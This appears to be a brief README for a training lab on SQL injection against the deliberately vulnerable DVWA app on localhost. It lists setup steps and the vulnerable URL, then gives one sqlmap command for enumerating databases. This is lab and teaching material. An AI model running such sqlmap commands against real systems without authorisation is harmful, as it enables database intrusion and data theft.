# cybersecurity-task-8
SQL Injection Practical Exploitation
Description
This project demonstrates SQL Injection vulnerability exploitation using Damn Vulnerable Web Application (DVWA) and SQLMap on Kali Linux.

## Requirements
- Kali Linux
- Apache2
- MariaDB (MySQL)
- DVWA
- SQLMap
- Firefox Browser

## Setup Steps
1. Install and start Apache and MariaDB
2. Install DVWA in `/var/www/html/dvwa`
3. Configure database credentials in `config.inc.php`
4. Login to DVWA and set security level to **Low**

## Vulnerable URL
http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit

## SQLMap Command Used
```bash
sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=low; PHPSESSID=<session_id>" \
--dbs --risk=3 --level=5 --batch
